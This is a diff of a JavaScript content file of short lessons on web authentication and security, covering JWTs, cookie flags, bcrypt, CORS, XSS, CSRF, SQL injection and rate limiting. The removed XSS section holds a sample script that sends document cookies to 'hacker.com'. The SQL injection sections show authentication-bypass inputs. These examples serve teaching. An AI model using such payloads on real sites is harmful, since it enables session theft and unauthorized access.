@@ -1,58 +1,177 @@
+// authContent.js
 export const authContent = {
-  1: {
+  "1": {
     title: "Authentication vs Authorization",
     sections: [
-      { heading: "Authentication (AuthN)", text: "The process of verifying WHO a user is. Usually handled by checking a username and password, or via OAuth (Google/GitHub login). If successful, the system issues a session ID or a token." },
-      { heading: "Authorization (AuthZ)", text: "The process of verifying WHAT a user is allowed to do. Once authenticated, the system checks the user's roles or permissions (e.g., standard user vs admin) before allowing access to a specific resource." }
+      {
+        heading: "Overview",
+        text: "Authentication verifies identity (who you are). Authorization determines permissions (what you can do)."
+      },
+      {
+        heading: "Examples",
+        text: "Login (authN) - you provide credentials. Then, access control (authZ) - you can access certain routes or resources."
+      },
+      {
+        heading: "Common Approaches",
+        text: "AuthN: passwords, MFA, biometrics. AuthZ: roles, policies, ACLs."
+      }
     ]
   },
-  2: {
-    title: "JSON Web Tokens (JWT)",
+  "2": {
+    title: "JWT (Structure + Refresh Tokens)",
     sections: [
-      { heading: "Structure", text: "A JWT consists of three base64url-encoded parts separated by dots: `Header.Payload.Signature`. The Header defines the algorithm (e.g., HS256). The Payload contains the claims (user data). The Signature is generated using a secret key held only by the server." },
-      { heading: "Statelessness", text: "JWTs do not require the server to store session data in a database. When a client sends a JWT, the server recalculates the signature using its secret key. If it matches the signature on the token, the payload is trusted and the user is authenticated." }
+      {
+        heading: "Overview",
+        text: "JWT (JSON Web Token) is a stateless authentication token containing claims."
+      },
+      {
+        heading: "Structure",
+        text: "Three parts: Header (algorithm, type), Payload (claims), Signature (HMAC or RSA). Base64Url encoded, concatenated with dots."
+      },
+      {
+        heading: "Refresh Tokens",
+        text: "Access tokens are short-lived. Refresh tokens (stored securely) are used to obtain new access tokens without re-authentication."
+      }
     ]
   },
-  3: {
+  "3": {
     title: "Sessions vs JWT",
     sections: [
-      { heading: "Session-Based Auth", text: "The server creates a session in its database/memory and sends a unique Session ID to the client (usually in a cookie). On every request, the client sends the ID, and the server looks it up in the database. Pros: Easy to revoke. Cons: Hard to scale horizontally (requires a centralized store like Redis)." },
-      { heading: "Token-Based Auth (JWT)", text: "The server signs a token and sends it to the client. The server stores nothing. Pros: Infinitely scalable, great for microservices. Cons: Cannot be easily revoked before expiration without implementing a complex token blacklist." }
+      {
+        heading: "Overview",
+        text: "Sessions are server-side, storing user data in memory or DB. JWT is stateless, storing claims client-side."
+      },
+      {
+        heading: "Sessions",
+        text: "Server stores session ID, client stores cookie. Stateful, requires session store (e.g., Redis)."
+      },
+      {
+        heading: "JWT",
+        text: "Self-contained, no server storage. Stateless, scalable, but cannot be invalidated easily unless using blacklists."
+      }
     ]
   },
-  4: {
-    title: "Cookies and Flags",
+  "4": {
+    title: "Cookies (HttpOnly, Secure, SameSite)",
     sections: [
-      { heading: "Secure Storage", text: "Storing JWTs in `localStorage` makes them vulnerable to XSS attacks (any JS on the page can read them). Storing them in cookies is safer, provided strict flags are used." },
-      { heading: "Critical Cookie Flags", text: "- `HttpOnly`: Prevents client-side JavaScript from accessing the cookie, entirely mitigating XSS token theft.\n- `Secure`: Ensures the cookie is only sent over HTTPS encrypted connections.\n- `SameSite=Strict`: Prevents the browser from sending the cookie with cross-site requests, mitigating CSRF attacks." }
+      {
+        heading: "Overview",
+        text: "Cookies are small data stored in the browser and sent with requests."
+      },
+      {
+        heading: "HttpOnly",
+        text: "Prevents JavaScript access, mitigating XSS. Should be set for session cookies."
+      },
+      {
+        heading: "Secure",
+        text: "Cookie sent only over HTTPS, protecting against MITM attacks."
+      },
+      {
+        heading: "SameSite",
+        text: "Restricts cross-site requests. `Strict` (same site only), `Lax` (top-level navigation), `None` (requires Secure)."
+      }
     ]
   },
-  5: {
-    title: "Password Hashing (Bcrypt)",
+  "5": {
+    title: "Bcrypt (Password Hashing, Salt Rounds)",
     sections: [
-      { heading: "Never Store Plaintext", text: "If a database is breached, plaintext passwords expose users across all their other accounts. Passwords must be hashed using a one-way algorithm (like Bcrypt or Argon2)." },
-      { heading: "Salting", text: "A 'salt' is a random string added to the password before hashing. This ensures that even if two users have the exact same password ('password123'), their resulting hashes will be completely different, nullifying Rainbow Table attacks." }
+      {
+        heading: "Overview",
+        text: "Bcrypt is a password hashing function designed to be slow and resistant to brute-force."
+      },
+      {
+        heading: "Salt",
+        text: "A random string added to each password before hashing, preventing rainbow table attacks."
+      },
+      {
+        heading: "Salt Rounds",
+        text: "Work factor controlling computational cost. Higher rounds (e.g., 12) increase security but also time."
+      }
     ]
   },
-  6: {
-    title: "Cross-Site Scripting (XSS)",
+  "6": {
+    title: "CORS (Cross-Origin Resource Sharing)",
     sections: [
-      { heading: "The Attack", text: "XSS occurs when an attacker injects malicious JavaScript into a legitimate website, which is then executed by the victim's browser. (e.g., submitting `<script>fetch('hacker.com/?cookie='+document.cookie)</script>` as a blog comment)." },
-      { heading: "Prevention", text: "Never trust user input. Always escape/sanitize data before rendering it in the DOM. Modern frameworks like React automatically sanitize variables rendered in JSX (unless you explicitly use `dangerouslySetInnerHTML`)." }
+      {
+        heading: "Overview",
+        text: "CORS is a browser security mechanism that restricts cross-origin requests."
+      },
+      {
+        heading: "How It Works",
+        text: "Browser sends preflight OPTIONS request for non-simple requests. Server responds with Access-Control-Allow-* headers."
+      },
+      {
+        heading: "Configuration",
+        text: "Server sets allowed origins, methods, headers. For credentials, `Access-Control-Allow-Credentials: true`."
+      }
     ]
   },
-  7: {
-    title: "Cross-Site Request Forgery (CSRF)",
+  "7": {
+    title: "XSS (Cross-Site Scripting) and Prevention",
     sections: [
-      { heading: "The Attack", text: "CSRF tricks a victim into submitting a malicious request on a site where they are currently authenticated. Because the browser automatically attaches cookies to requests, if a victim clicks a disguised link on a malicious site, it will hit your server with their valid auth cookies." },
-      { heading: "Prevention", text: "1. Use the `SameSite=Lax` or `Strict` flag on cookies. 2. Require an Anti-CSRF token (a unique, hidden value generated by the server and validated on state-changing requests)." }
+      {
+        heading: "Overview",
+        text: "XSS injects malicious scripts into web pages, executed in users' browsers."
+      },
+      {
+        heading: "Types",
+        text: "Stored (database), Reflected (URL parameter), DOM-based (client-side)."
+      },
+      {
+        heading: "Prevention",
+        text: "Sanitize input, escape output (HTML entity encoding), use Content Security Policy (CSP), and HttpOnly cookies."
+      }
     ]
   },
-  8: {
-    title: "SQL Injection",
+  "8": {
+    title: "CSRF (Cross-Site Request Forgery) and Prevention",
     sections: [
-      { heading: "The Attack", text: "Occurs when user input is concatenated directly into a database query. E.g., `SELECT * FROM users WHERE email = '\" + email + \"'`. An attacker could input `' OR 1=1 --`, resulting in a query that bypasses authentication entirely." },
-      { heading: "Prevention", text: "Use Prepared Statements (Parameterized Queries) or an ORM like Mongoose/Prisma. These technologies ensure that user input is treated strictly as data, not as executable code." }
+      {
+        heading: "Overview",
+        text: "CSRF tricks a user into performing unwanted actions on a site where they are authenticated."
+      },
+      {
+        heading: "Prevention",
+        text: "Anti-CSRF tokens (synchronizer tokens), SameSite cookies (Lax/Strict), and checking Referer header."
+      },
+      {
+        heading: "Example",
+        text: "An attacker posts a form to bank.com/transfer using the victim's session. Token prevents this."
+      }
+    ]
+  },
+  "9": {
+    title: "SQL Injection and Prevention",
+    sections: [
+      {
+        heading: "Overview",
+        text: "SQL injection occurs when user input is concatenated into SQL queries, allowing malicious SQL execution."
+      },
+      {
+        heading: "Prevention",
+        text: "Use parameterized queries (prepared statements) or ORM frameworks. Validate and sanitize input."
+      },
+      {
+        heading: "Example",
+        text: "`SELECT * FROM users WHERE username = 'admin' OR '1'='1'` - bypasses authentication."
+      }
+    ]
+  },
+  "10": {
+    title: "Rate Limiting & Helmet.js",
+    sections: [
+      {
+        heading: "Overview",
+        text: "Rate limiting controls request frequency to prevent abuse. Helmet.js sets security HTTP headers."
+      },
+      {
+        heading: "Rate Limiting",
+        text: "Implement with express-rate-limit (Node.js). Limits per IP or user; helps against brute-force and DDoS."
+      },
+      {
+        heading: "Helmet.js",
+        text: "Middleware that sets headers like X-Frame-Options, X-XSS-Protection, X-Content-Type-Options, and CSP."
+      }
     ]
   }
 };
